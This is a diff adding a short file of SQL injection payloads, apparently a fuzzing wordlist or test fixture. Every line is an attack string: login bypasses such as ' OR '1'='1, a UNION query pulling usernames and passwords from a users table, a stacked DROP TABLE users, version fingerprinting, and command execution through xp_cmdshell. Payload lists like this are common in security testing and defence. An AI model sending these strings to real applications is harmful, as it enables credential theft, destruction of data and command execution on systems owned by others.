@@ -1,0 +1,9 @@
+' OR '1'='1
+' UNION SELECT username, password FROM users--
+admin'--
+1; DROP TABLE users--
+' OR 1=1--
+' UNION SELECT null, version()--
+' AND 1=2 UNION SELECT null, null--
+' OR 'x'='x'--
+1; EXEC xp_cmdshell('ping 127.0.0.1')--
